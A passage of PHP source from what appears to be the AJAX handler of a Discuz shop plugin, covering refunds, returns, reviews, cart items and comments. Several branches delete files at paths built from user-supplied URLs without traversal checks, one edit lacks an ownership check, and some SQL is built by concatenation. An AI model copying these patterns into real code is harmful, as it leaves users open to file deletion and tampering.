			DB::query("delete from ".DB::table('it618_brand_money')." where it618_saleid=".$saleid);
			
			if($IsUnion==1)DB::query("update ".DB::table('it618_union_tuitc')." set it618_state=1 where it618_saleid=".$saleid);
			
			it618_brand_updategoodscount($it618_brand_sale,'tui');
			
			$salecount = C::t('#it618_brand#it618_brand_sale')->count_by_it618_pid($it618_brand_sale['it618_pid']);
			C::t('#it618_brand#it618_brand_goods')->update_it618_salecount_by_id($it618_brand_sale['it618_pid'],$salecount);
			
			if($it618_brand_sale['it618_type']==1){
				C::t('common_member_count')->increase($it618_brand_sale['it618_uid'], array(
					'extcredits'.$it618_brand['brand_credit'] => $it618_brand_sale['it618_sfscore'])
				);
			}else{
				$money1=round(($it618_brand_sale['it618_price']*$it618_brand_sale['it618_count']*$it618_brand_sale['it618_zk']/100),2)+$it618_brand_sale['it618_yunfei']-$it618_brand_sale['it618_quanmoney'];
				if($money1<0)$money1=0;
				C::t('common_member_count')->increase($it618_brand_brand['it618_uid'], array(
					'extcredits'.$it618_brand['brand_credit'] => intval($money1*$it618_brand_sale['it618_alipaybl']/100))
				);	
				
				$money=$it618_brand_sale['it618_sfmoney'];
				
				$it618_bz=$it618_brand_lang['s1924'];
				$it618_bz=str_replace("{money}",$money,$it618_bz);
				$it618_bz=str_replace("{saleid}",$saleid,$it618_bz);
				
				require_once DISCUZ_ROOT.'./source/plugin/it618_credits/function.func.php';
				savemoney(array(
					'it618_uid' => $it618_brand_sale['it618_uid'],
					'it618_type' => 'zy',
					'it618_money1' => $money,
					'it618_bz' => $it618_bz,
					'it618_zytype' => 'it618_brand_tk',
					'it618_zyid' => $saleid,
					'it618_time' => $_G['timestamp']
				));
			}
			
			it618_brand_sendmessage('sale2state_user',$_GET['saleid'],'tongyitui');
			if(isset($_GET['ac2']))it618_brand_yuangongsale($ShopId,$uid,1,$_GET['saleid'],$it618_brand_lang['s1783'],$_G['timestamp']);
		
			echo 'okit618_split'.it618_brand_getlang('s1465');
		}else{
		
			it618_brand_sendmessage('sale2state_user',$_GET['saleid'],'tongyitui');
			it618_brand_sendmessage('tk_admin',$_GET['saleid']);
			
			if(isset($_GET['ac2']))it618_brand_yuangongsale($ShopId,$uid,1,$_GET['saleid'],$it618_brand_lang['s1783'],$_G['timestamp']);
			
			echo 'okit618_split'.it618_brand_getlang('s1180');
		}
	}
}


if($_GET['ac']=="jujuetui"){
	if($uid<=0){
		echo 'it618_split'.it618_brand_getlang('s671');exit;
	}else{
		if(isset($_GET['ac2'])){
			$count=C::t('#it618_brand#it618_brand_yuangong')->count_by_uid_shopid('it618_isxssale',$uid,$ShopId);
			if($count==0){
				echo 'it618_split'.$it618_brand_lang['s1699'];exit;
			}
		}else{
			if(isset($_GET['adminsid'])){
				$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
				if(!in_array($_G['uid'],$shopadmin)){
					echo 'it618_split'.it618_brand_getlang('s1220');exit;
				}
			}else{
				$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
				if($it618_brand_brand['it618_uid']!=$uid){
					echo 'it618_split'.it618_brand_getlang('s671');exit;
				}
			}
		}
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		C::t('#it618_brand#it618_brand_sale')->update($_GET['saleid'],array(
			'it618_state_tuihuo' => 3
		));
		
		it618_brand_sendmessage('sale2state_user',$_GET['saleid'],'jujuetui');
		
		if(isset($_GET['ac2']))it618_brand_yuangongsale($ShopId,$uid,1,$_GET['saleid'],$it618_brand_lang['s1784'],$_G['timestamp']);
		
		echo 'okit618_split'.it618_brand_getlang('s1181');
	}
}


if($_GET['ac']=="salebz"){
	if($uid<=0){
		echo 'it618_split'.it618_brand_getlang('s671');exit;
	}else{
		if(isset($_GET['ac2'])){
			$count=C::t('#it618_brand#it618_brand_yuangong')->count_by_uid_shopid('it618_isxssale',$uid,$ShopId);
			if($count==0){
				echo 'it618_split'.$it618_brand_lang['s1699'];exit;
			}
		}else{
			if(isset($_GET['adminsid'])){
				$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
				if(!in_array($_G['uid'],$shopadmin)){
					echo 'it618_split'.it618_brand_getlang('s1220');exit;
				}
			}else{
				$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
				if($it618_brand_brand['it618_uid']!=$uid){
					echo 'it618_split'.it618_brand_getlang('s671');exit;
				}
			}
		}
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
			C::t('#it618_brand#it618_brand_sale')->update($_GET['saleid'],array(
			'it618_salebz' => it618_brand_utftogbk($_GET["bzvalue"])
		));
		
		echo 'okit618_split'.it618_brand_getlang('s1837');
	}
}


if($_GET['ac']=="tuikuan"){
	$saleid=intval($_GET['saleid']);
	if($uid!=C::t('#it618_brand#it618_brand_sale')->fetch_uid_by_id($saleid)){
		echo it618_brand_getlang('s1213');exit;
	}
	$it618_state=C::t('#it618_brand#it618_brand_sale')->fetch_state_by_id($_GET['saleid']);
	
	if($it618_state==1){
	}else{
		echo it618_brand_getlang('s1213');exit;
	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	
	if($IsCredits==1&&$it618_brand['brand_tktype']==1){
		$it618_brand_sale = DB::fetch_first("SELECT * FROM ".DB::table('it618_brand_sale')." where id=".$saleid);
		$it618_brand_brand = C::t('#it618_brand#it618_brand_brand')->fetch_by_id($it618_brand_sale['it618_shopid']);
		
		C::t('#it618_brand#it618_brand_sale')->update_it618_state($saleid,4);
		DB::query("delete from ".DB::table('it618_brand_money')." where it618_saleid=".$saleid);
		if($IsUnion==1)DB::query("update ".DB::table('it618_union_tuitc')." set it618_state=1 where it618_saleid=".$saleid);
		
		it618_brand_updategoodscount($it618_brand_sale,'tui');
		
		if($it618_brand_sale['it618_type']==1){
			C::t('common_member_count')->increase($it618_brand_sale['it618_uid'], array(
				'extcredits'.$it618_brand['brand_credit'] => $it618_brand_sale['it618_sfscore'])
			);
			
			it618_brand_sendmessage('tk_user',$saleid);
		
			echo 'okit618_split'.it618_brand_getlang('s1926');
		}else{
			$money1=round(($it618_brand_sale['it618_price']*$it618_brand_sale['it618_count']*$it618_brand_sale['it618_zk']/100),2)+$it618_brand_sale['it618_yunfei']-$it618_brand_sale['it618_quanmoney'];
			if($money1<0)$money1=0;
			C::t('common_member_count')->increase($it618_brand_brand['it618_uid'], array(
				'extcredits'.$it618_brand['brand_credit'] => intval($money1*$it618_brand_sale['it618_alipaybl']/100))
			);	
			
			if($IsUnion==1)DB::query("update ".DB::table('it618_union_tuitc')." set it618_state=1 where it618_saleid=".$saleid);
			
			$money=$it618_brand_sale['it618_sfmoney'];
			
			$it618_bz=$it618_brand_lang['s1924'];
			$it618_bz=str_replace("{money}",$money,$it618_bz);
			$it618_bz=str_replace("{saleid}",$saleid,$it618_bz);
			
			require_once DISCUZ_ROOT.'./source/plugin/it618_credits/function.func.php';
			savemoney(array(
				'it618_uid' => $it618_brand_sale['it618_uid'],
				'it618_type' => 'zy',
				'it618_money1' => $money,
				'it618_bz' => $it618_bz,
				'it618_zytype' => 'it618_brand_tk',
				'it618_zyid' => $saleid,
				'it618_time' => $_G['timestamp']
			));
			
			it618_brand_sendmessage('tk_user',$saleid);
		
			echo 'okit618_split'.it618_brand_getlang('s1925');
		}
	}else{
		C::t('#it618_brand#it618_brand_sale')->update_it618_state($_GET['saleid'],3);
		
		it618_brand_sendmessage('tk_admin',$saleid);
		
		echo 'okit618_split'.it618_brand_getlang('s1214');
	}
}


if($_GET['ac']=="saletui"){
	$saleid=intval($_GET['saleid']);
	if($uid!=C::t('#it618_brand#it618_brand_sale')->fetch_uid_by_id($saleid)){
		echo it618_brand_getlang('s1213');exit;
	}
	
	$it618_state=C::t('#it618_brand#it618_brand_sale')->fetch_state_by_id($_GET['saleid']);
	$it618_state_tuihuo=C::t('#it618_brand#it618_brand_sale')->fetch_state_tuihuo_by_id($_GET['saleid']);
	
	if($it618_state==1||($it618_state==3&&$it618_state_tuihuo==3)){
	}else{
		echo it618_brand_getlang('s1213');exit;
	}
	
	C::t('#it618_brand#it618_brand_sale')->update($saleid,array(
		'it618_content_tuihuo' => dhtmlspecialchars(it618_brand_utftogbk($_GET["tuivalue"])),
		'it618_state_tuihuo' => 1
	));
	
	it618_brand_sendmessage('sale2state_shop',$_GET['saleid'],'tuihuo');
	
	echo 'okit618_split'.it618_brand_getlang('s1215');
}


if($_GET['ac']=="salepj"){
	$saleid=intval($_GET['saleid']);
	$it618_brand_sale=C::t('#it618_brand#it618_brand_sale')->fetch_by_id($saleid);
	$flag=0;
	if($it618_brand_sale['it618_pj']>0){
		$brand_shopadmin=explode(",",$it618_brand['brand_shopadmin']);
		if(!in_array($_G['uid'], $brand_shopadmin)){
			echo it618_brand_getlang('s1213');exit;
		}
	}else{
		if($uid!=C::t('#it618_brand#it618_brand_sale')->fetch_uid_by_id($saleid)){
			echo it618_brand_getlang('s1213');exit;
		}
		
		$it618_state=C::t('#it618_brand#it618_brand_sale')->fetch_state_by_id($_GET['saleid']);
		
		if($it618_state==2){
		}else{
			echo it618_brand_getlang('s1213');exit;
		}
		$flag=1;
	}
	
	if($_GET['ac1']=="addpjpic"){
		$count=C::t('#it618_brand#it618_brand_sale_pjpic')->count_by_saleid($_GET['saleid']);
		if($count<5){
			$id=C::t('#it618_brand#it618_brand_sale_pjpic')->insert(array(
				'it618_saleid' => $_GET['saleid'],
				'it618_pjpic' => $_GET['picurl'],
				'it618_time' => $_G['timestamp']
			), true);
			
			it618_brand_getpjpic($it618_brand_sale['it618_uid'],$id,$_GET['picurl']);
		}
	}elseif($_GET['ac1']=="delpjpic"){
		$it618_brand_sale_pjpic=C::t('#it618_brand#it618_brand_sale_pjpic')->fetch_by_id($_GET['pjpicid']);
		
		$it618_pjpic=$it618_brand_sale_pjpic['it618_pjpic'];
		$tmparr=explode("source",$it618_pjpic);
		$it618_pjpic=DISCUZ_ROOT.'./source'.$tmparr[1];

		if(file_exists($it618_pjpic)){
			$result=unlink($it618_pjpic);
		}
		
		$file_ext=strtolower(substr($it618_brand_sale_pjpic['it618_pjpic'],strrpos($it618_brand_sale_pjpic['it618_pjpic'], '.')+1)); 
		$file_extarr=explode("?",$file_ext);
		$file_ext=$file_extarr[0];
		$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/data/user/u'.$it618_brand_sale['it618_uid'].'/smallimage/pjpic'.$it618_brand_sale_pjpic['id'].'.'.$file_ext;
		if(file_exists($it618_smallurl)){
			$result=unlink($it618_smallurl);
		}
		C::t('#it618_brand#it618_brand_sale_pjpic')->delete_by_id($_GET['pjpicid']);
	}else{
		C::t('#it618_brand#it618_brand_sale')->update($saleid,array(
			'it618_content_pj' => dhtmlspecialchars(it618_brand_utftogbk($_GET["pjvalue"])),
			'it618_pj' => $_GET["goodspj"]
		));
		
		$it618_brand_sale=C::t('#it618_brand#it618_brand_sale')->fetch_by_id($saleid);
		
		$pjhaocount=C::t('#it618_brand#it618_brand_sale')->count_by_it618_pj_pid(1,$it618_brand_sale['it618_pid']);
		$pjzhongcount=C::t('#it618_brand#it618_brand_sale')->count_by_it618_pj_pid(2,$it618_brand_sale['it618_pid']);
		$pjchacount=C::t('#it618_brand#it618_brand_sale')->count_by_it618_pj_pid(3,$it618_brand_sale['it618_pid']);
	
		DB::query("update ".DB::table('it618_brand_goods')." set it618_pjhaocount=".$pjhaocount.",it618_pjzhongcount=".$pjzhongcount.",it618_pjchacount=".$pjchacount." where id=".$it618_brand_sale['it618_pid']);
		
		$pjcount=C::t('#it618_brand#it618_brand_sale')->count_by_it618_pj_shopid($it618_brand_sale['it618_shopid']);
		C::t('#it618_brand#it618_brand_brand')->update($it618_brand_sale['it618_shopid'],array(
			'it618_levelsum' => $pjcount
		));
		
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		
		if($flag==1){
			C::t('#it618_brand#it618_brand_sale')->update($saleid,array(
				'it618_pjtime' => $_G['timestamp']
			));
			echo 'okit618_split'.it618_brand_getlang('s1269');
		}else{
			echo 'editokit618_split'.$it618_brand_lang['s473'].it618_brand_getlang('s1269');
		}
	}
}


if($_GET['ac']=="getpjpic"){
	$n=0;
	$it618_brand_sale=C::t('#it618_brand#it618_brand_sale')->fetch_by_id($_GET['saleid']);
	foreach(C::t('#it618_brand#it618_brand_sale_pjpic')->fetch_all_by_saleid($_GET['saleid']) as $it618_brand_sale_pjpic) {
		$file_ext=strtolower(substr($it618_brand_sale_pjpic['it618_pjpic'],strrpos($it618_brand_sale_pjpic['it618_pjpic'], '.')+1)); 
		$file_extarr=explode("?",$file_ext);
		$file_ext=$file_extarr[0];
		$it618_smallurl='source/plugin/it618_brand/kindeditor/data/user/u'.$it618_brand_sale['it618_uid'].'/smallimage/pjpic'.$it618_brand_sale_pjpic['id'].'.'.$file_ext;
			
		$tmpstr.='<li><img src="'.$it618_smallurl.'"/><span onclick="delpjpic('.$_GET['saleid'].','.$it618_brand_sale_pjpic['id'].')">'.$it618_brand_lang['s458'].'</span></li>';
		$n=$n+1;
	}
	if($n>0){
		$tmpstr.='<li class="litxt">'.$n.'/5</li>';
	}else{
		$tmpstr.='<li class="litxt">'.$it618_brand_lang['s1832'].'</li>';
	}
	
	echo $tmpstr.'<input type="hidden" id="pjpiccount" value="'.$n.'">';
}


if($_GET['ac']=="shouhuo"){
	if($uid!=C::t('#it618_brand#it618_brand_sale')->fetch_uid_by_id($_GET['saleid'])){
		echo it618_brand_getlang('s1213');exit;
	}
	
	$it618_state=C::t('#it618_brand#it618_brand_sale')->fetch_state_by_id($_GET['saleid']);
	$it618_state_tuihuo=C::t('#it618_brand#it618_brand_sale')->fetch_state_tuihuo_by_id($_GET['saleid']);
	
	if($it618_state==1||($it618_state==3&&$it618_state_tuihuo==3)){
	}else{
		echo it618_brand_getlang('s1213');exit;
	}
	
	it618_brand_qrxf($_GET['saleid']);
	
	it618_brand_sendmessage('sale2state_shop',$_GET['saleid'],'shouhuo');
	
	echo 'okit618_split'.it618_brand_getlang('s1216');
}


if($_GET['ac']=="addmycard"){
	if($uid<=0){
		echo it618_brand_getlang('s671');exit;
	}else{
		$count=C::t('#it618_brand#it618_brand_card')->count_by_tel(it618_brand_utftogbk($_GET['it618_tel']));
		if($count>0){
			echo it618_brand_getlang('s1144');exit;
		}
		C::t('#it618_brand#it618_brand_card')->insert(array(
			'it618_uid' => $uid,
			'it618_name' => it618_brand_utftogbk($_GET['it618_name']),
			'it618_tel' => it618_brand_utftogbk($_GET['it618_tel']),
			'it618_state' => 0
		), true);
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		echo 'okit618_split'.it618_brand_getlang('s1433');
	}
}


if($_GET['ac']=="editcardname"){
	if($uid<=0){
		echo 'it618_split'.it618_brand_getlang('s671');exit;
	}else{
		C::t('#it618_brand#it618_brand_card')->update($_GET['cid'],array(
			'it618_name' => it618_brand_utftogbk($_GET['it618_name'])
		), true);
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		echo 'okit618_split'.it618_brand_getlang('s1707');
	}
}


if($_GET['ac']=="getgwc"){
	if($uid>0){
		$count=C::t('#it618_brand#it618_brand_gwc')->count_by_uid_pid_gtypeid($uid,$_GET['pid'],$_GET['gtypeid']);
		if($count>0){
			echo '2';
		}else{
			$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($_GET['pid']);
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($it618_brand_goods['it618_shopid']);
			if($it618_brand['brand_buyself']==0){
				if($it618_brand_brand['it618_uid']==$uid){
					echo it618_brand_getlang('s588');exit;
				}
			}
			
			$pid=intval($_GET['pid']);
			
			if($IsGroup==1){
				$salepower=it618_brand_groupsalepower($pid);
				if($salepower==1){
					echo it618_brand_getlang('s1969');exit;
				}
				if($salepower==2){
					echo it618_brand_getlang('s1970');exit;
				}
			}
		
			if($IsUnion==1&&$_GET['tuijcode']!=''){
				require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
				$it618_tuijid=Union_IsTuiJoin('brand',$pid,$_GET['tuijcode']);
			}
			
			C::t('#it618_brand#it618_brand_gwc')->insert(array(
				'it618_uid' => $uid,
				'it618_pid' => $_GET['pid'],
				'it618_shopid' => $it618_brand_goods['it618_shopid'],
				'it618_gtypeid' => $_GET['gtypeid'],
				'it618_tuijid' => $it618_tuijid,
				'it618_saletype' => $_GET['saletype'],
				'it618_kdid' => $_GET['kdid']
			), true);
			
			$count=C::t('#it618_brand#it618_brand_gwc')->count_by_uid($uid);
			echo '1it618_split'.$count;
		}
	}else{
		echo $it618_brand_lang['s436'];
	}
}


if($_GET['ac']=="brandmode"){
	$brandmode=getcookie('brandmode');
	if($brandmode==''){
		if($it618_brand['brand_mode']==3)$brandmode='it618brand';else $brandmode='it618goods';
	}
	if($brandmode=='it618brand')$brandmode='it618goods';else $brandmode='it618brand';
	dsetcookie('brandmode',$brandmode,31536000);
	echo 'ok';
}


if($_GET['ac']=="brandstyle"){
	$brandstyle=getcookie('brandstyle');
	if($brandstyle==''){
		if($it618_brand['brand_style']==3)$brandstyle='1';else $brandstyle='2';
	}
	if($brandstyle=='1')$brandstyle='2';else $brandstyle='1';
	dsetcookie('brandstyle',$brandstyle,31536000);
	echo 'ok';
}


if($_GET['ac']=="imgdelete"){
	if($uid<=0){
		echo '0';
	}else{
		$shopid=intval($_GET['shopid']);
		
		if($shopid==0){
			$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
			if(!in_array($_G['uid'],$shopadmin)){
				echo '0';exit;
			}
		}else{
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($shopid);
			if($it618_brand_brand['it618_uid']!=$uid){
				echo '0';exit;
			}
		}
		
		if($shopid==0){
			$tmparr=explode('source/plugin/it618_brand/kindeditor/attached/image/',$_GET['imgurl']);
			if(count($tmparr)>1){
				$delpath=DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/attached/image/'.$tmparr[1];
			}
			$tmparr=explode('source/plugin/it618_brand/kindeditor/data/shop',$_GET['imgurl']);
			if(count($tmparr)>1){
				$delpath=DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/data/shop'.$tmparr[1];
			}
		}else{
			$tmparr=explode('source/plugin/it618_brand/kindeditor/data/shop'.$shopid.'/',$_GET['imgurl']);
			if(count($tmparr)>1){
				$delpath=DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/data/shop'.$shopid.'/'.$tmparr[1];
			}
		}
		
		if (file_exists($delpath)) {
			$result=unlink($delpath);
			if(it618_brand_dirsize(dirname($delpath))==0){
				rmdir(dirname($delpath));
			}
			
			echo '1';
		}else{
			echo '0';
		}
	}
}


if($_GET['ac']=="ly_add"){
	if(strtolower($_GET['validatecode']) != strtolower($_SESSION['validatecode'])&&$it618_brand['brand_validatecode']==1){
		echo 'errorvalidatecode';
	}else{
		if($uid<=0){
			echo it618_brand_getlang('s171');
		}else{
			
			if($pagetype=='shop'){
				if($Shop_ishomely==0){
					echo it618_brand_getlang('s447');
				}else{
					$id = C::t('#it618_brand#it618_brand_home_ly')->insert(array(
						'it618_shopid' => $ShopId,
						'it618_uid' => $uid,
						'it618_quoteid' => $_GET['it618_quoteid'],
						'it618_content' => it618_brand_utftogbk($_GET['it618_content']),
						'it618_time' => $_G['timestamp']
					), true);
				}
		    }
			
			if($pagetype=='product'){
				if($Shop_isproductly==0){
					echo it618_brand_getlang('s448');
				}else{
					$id = C::t('#it618_brand#it618_brand_product_ly')->insert(array(
						'it618_shopid' => $ShopId,
						'it618_pid' => $idforly,
						'it618_uid' => $uid,
						'it618_quoteid' => $_GET['it618_quoteid'],
						'it618_content' => it618_brand_utftogbk($_GET['it618_content']),
						'it618_time' => $_G['timestamp']
					), true);
				}
			}
			
			if($pagetype=='article'){
				if($Shop_isarticlely==0){
					echo it618_brand_getlang('s449');
				}else{
					$id = C::t('#it618_brand#it618_brand_article_ly')->insert(array(
						'it618_shopid' => $ShopId,
						'it618_aid' => $idforly,
						'it618_uid' => $uid,
						'it618_quoteid' => $_GET['it618_quoteid'],
						'it618_content' => it618_brand_utftogbk($_GET['it618_content']),
						'it618_time' => $_G['timestamp']
					), true);
				}
			}
			
			if($id>0){
				echo it618_brand_getlang('s450');
			}else{
				echo it618_brand_getlang('s451');
			}

		}
	}
}


if($_GET['ac']=="ly_del"){
	if($uid<=0){
		echo it618_brand_getlang('s171');
	}else{
		$brand_shopadmin=explode(",",$it618_brand['brand_shopadmin']);
		if($_G['uid']==$ShopUid||in_array($_G['uid'], $brand_shopadmin)){
			if($pagetype=='shop')C::t('#it618_brand#it618_brand_home_ly')->delete_by_id($_GET['it618_lid']);
			if($pagetype=='product')C::t('#it618_brand#it618_brand_product_ly')->delete_by_id($_GET['it618_lid']);
			if($pagetype=='article')C::t('#it618_brand#it618_brand_article_ly')->delete_by_id($_GET['it618_lid']);
			echo it618_brand_getlang('s1744');
		}else{
			echo it618_brand_getlang('s452');
		}
	}
}


if($_GET['ac']=="editly"){
	if($uid<=0){
		echo it618_brand_getlang('s171');
	}else{
		$brand_shopadmin=explode(",",$it618_brand['brand_shopadmin']);
		if($_G['uid']==$ShopUid||in_array($_G['uid'], $brand_shopadmin)){
			if($pagetype=='shop')C::t('#it618_brand#it618_brand_home_ly')->update(intval($_GET['it618_lid']),array(
				'it618_content' => it618_brand_utftogbk($_GET['it618_content'])
			));
			if($pagetype=='product')C::t('#it618_brand#it618_brand_product_ly')->update(intval($_GET['it618_lid']),array(
				'it618_content' => it618_brand_utftogbk($_GET['it618_content'])
			));
			if($pagetype=='article')C::t('#it618_brand#it618_brand_article_ly')->update(intval($_GET['it618_lid']),array(
				'it618_content' => it618_brand_utftogbk($_GET['it618_content'])
			));
			
			echo $it618_brand_lang['t699'];
		}else{
			echo it618_brand_getlang('s452');
		}
	}
}


if($_GET['ac']=="geteditly"){
	if($uid<=0){
		echo it618_brand_getlang('s171');
	}else{
		$brand_shopadmin=explode(",",$it618_brand['brand_shopadmin']);
		if($_G['uid']==$ShopUid||in_array($_G['uid'], $brand_shopadmin)){
			if($pagetype=='shop')$tmply=C::t('#it618_brand#it618_brand_home_ly')->fetch_by_id($_GET['it618_lid']);
			if($pagetype=='product')$tmply=C::t('#it618_brand#it618_brand_product_ly')->fetch_by_id($_GET['it618_lid']);
			if($pagetype=='article')$tmply=C::t('#it618_brand#it618_brand_article_ly')->fetch_by_id($_GET['it618_lid']);
			
			echo $tmply['it618_content'];
		}else{
			echo it618_brand_getlang('s452');
		}
	}
}


if($_GET['ac']=="ly_get"){
	$page = max(1, intval($_GET['page']));
	
	if($pagetype=='shop'){
		$ppp = $Shop_homelycount;$strtmply=it618_brand_getlang('s453');
		$startlimit = ($page - 1) * $ppp;
		$count = C::t('#it618_brand#it618_brand_home_ly')->count_by_shopid($ShopId);
		$it618_brand_lys=C::t('#it618_brand#it618_brand_home_ly')->fetch_all_by_shopid($ShopId,$startlimit,$ppp);
	}
	if($pagetype=='product'){
		$ppp = $Shop_productlycount;$strtmply=it618_brand_getlang('s454');
		$startlimit = ($page - 1) * $ppp;
		$count = C::t('#it618_brand#it618_brand_product_ly')->count_by_it618_pid($idforly);
		$it618_brand_lys=C::t('#it618_brand#it618_brand_product_ly')->fetch_all_by_it618_pid($idforly,$startlimit,$ppp);
	}
	if($pagetype=='article'){
		$ppp = $Shop_articlelycount;$strtmply=it618_brand_getlang('s454');
		$startlimit = ($page - 1) * $ppp;
		$count = C::t('#it618_brand#it618_brand_article_ly')->count_by_it618_aid($idforly);
		$it618_brand_lys=C::t('#it618_brand#it618_brand_article_ly')->fetch_all_by_it618_aid($idforly,$startlimit,$ppp);
	}

	if($_GET['wap']==0){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&pagetype=$pagetype&idforly=$idforly");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='getlylist(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='getlylist(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=','getlylist(',$multipage);
		$multipage=str_replace('this.value;;','this.value);',$multipage);
		$multipage=str_replace('<div class="pg">','<div class="pg"><span style="float:left;font-weight:bold">'.it618_brand_getlang('s455').'<font color=red>'.$count.'</font>'.it618_brand_getlang('s456').$strtmply.'</span> ',$multipage);
	}else{
		if($ppp==0)$ppp=10;
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&pagetype=$pagetype&idforly=$idforly&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="getlylist(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&pagetype=$pagetype&idforly=$idforly&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getlylist(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&pagetype=$pagetype&idforly=$idforly&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getlylist(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&pagetype=$pagetype&idforly=$idforly&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getlylist(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&pagetype=$pagetype&idforly=$idforly&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getlylist(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
			}
			$multipage=it618_brand_getlang('s455').'<font color=red>'.$count.'</font>'.it618_brand_getlang('s456').$strtmply.' '.$pagepre.' '.$curpage.' '.$pagenext;
		}

	}
	
	$n=$startlimit+1;
	
	foreach($it618_brand_lys as $it618_brand_ly) {

		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')return;

		$username=it618_brand_getusername($it618_brand_ly['it618_uid']);
		
		$brand_shopadmin=explode(",",$it618_brand['brand_shopadmin']);
		if($_G['uid']==$ShopUid||in_array($_G['uid'], $brand_shopadmin)){
			$strtmpdel='<a href="javascript:" class="saleabtn" style="height:23px;line-height:23px;" onclick="editly(\''.$it618_brand_ly['id'].'\')" class="a1">'.it618_brand_getlang('s109').'</a> <a href="javascript:" class="saleabtn" style="height:23px;line-height:23px;" onclick="if(confirm(\''.it618_brand_getlang('s457').'\'))delly(\''.$it618_brand_ly['id'].'\')" class="a1">'.it618_brand_getlang('s458').'</a>';
		}
		
		if($_GET['wap']==0){
		$lylist_get.='<div class="booklist" id="mr'.$it618_brand_ly['id'].'">
							<div class="fl a1"><a href="'.it618_brand_rewriteurl($it618_brand_ly['it618_uid']).'" target="_blank"><img src="'.it618_brand_discuz_uc_avatar($it618_brand_ly['it618_uid'],'small').'" alt="'.it618_brand_getlang('s408').$username.it618_brand_getlang('s409').'" width="50" height="50" /></a></div>
							<div class="fl a2"><div class="b1"><a href="'.it618_brand_rewriteurl($it618_brand_ly['it618_uid']).'" target="_blank" title="'.it618_brand_getlang('s408').$username.it618_brand_getlang('s409').'" class="a1">'.$username.'</a><font color=#999999>('.$it618_brand_ly['it618_uid'].')</font> '.it618_brand_getonlinestate($it618_brand_ly['it618_uid']).' '.$strtmpdel.' <font color=#666666>'.it618_brand_getlang('s459').'</font></div>
							<div class="b2">'.it618_brand_getquote($pagetype,$it618_brand_ly['it618_quoteid']).str_replace('[br]','<br>',dhtmlspecialchars($it618_brand_ly['it618_content'])).'</div>
							<div class="b3"><span class="a1">'.it618_brand_getlang('s460').($count-$n+1).it618_brand_getlang('s461').' </span><font color="gray">'.date('Y-m-d H:i:s', $it618_brand_ly['it618_time']).'</font>&nbsp; <a href="javascript:" class="saleabtn" style="height:23px;line-height:23px;" onclick="bookquote(\''.($count-$n+1).'\',\''.$it618_brand_ly['id'].'\')" class="a1">'.it618_brand_getlang('s462').'</a></div>
							</div>
						</div>';
		}else{
			$lylist_get.='<div class="booklist" id="mr'.$it618_brand_ly['id'].'">
